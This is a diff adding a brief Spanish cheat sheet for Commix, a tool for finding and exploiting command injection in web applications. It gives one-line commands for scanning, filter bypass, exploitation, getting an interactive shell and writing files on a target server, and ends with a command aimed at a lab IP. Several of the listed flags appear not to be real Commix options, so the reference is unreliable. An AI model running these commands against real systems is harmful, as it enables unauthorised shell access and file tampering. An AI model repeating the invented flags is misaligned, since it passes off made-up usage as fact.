@@ -1,0 +1,21 @@
+Commix es una herramienta para evaluar y mejorar la seguridad de las aplicaciones web al identificar y explotar vulnerabilidades de inyección de comandos de manera automatizada.
+
+Scan (Escaneo): Este comando se utiliza para escanear una URL en busca de posibles vulnerabilidades de inyección de comandos.
+commix.py --url "http://example.com/page.php?param=value"
+
+Detect (Detección): Este comando se utiliza para detectar automáticamente la presencia de una vulnerabilidad de inyección de comandos en una URL.
+commix.py --url "http://example.com/page.php?param=value" --detection=1
+
+Bypass (Evasión): Este comando se utiliza para intentar evadir medidas de seguridad como filtros de caracteres o listas negras.
+commix.py --url "http://example.com/page.php?param=value" --bypass=1
+
+Exploit (Explotación): Este comando se utiliza para explotar una vulnerabilidad de inyección de comandos una vez que se ha identificado.
+commix.py --url "http://example.com/page.php?param=value" --exploit=1
+
+OS Shell (Shell del Sistema Operativo): Este comando se utiliza para obtener acceso a una shell interactiva del sistema operativo objetivo.
+commix.py --url "http://example.com/page.php?param=value" --os-shell
+
+File Write (Escritura de Archivos): Este comando se utiliza para escribir datos en archivos del sistema objetivo.
+commix.py --url "http://example.com/page.php?param=value" --file-write="/path/to/file" --file-dest="/path/on/server"
+
+commix --url="http://10.0.2.14/index.php?page=INJECT_HERE"
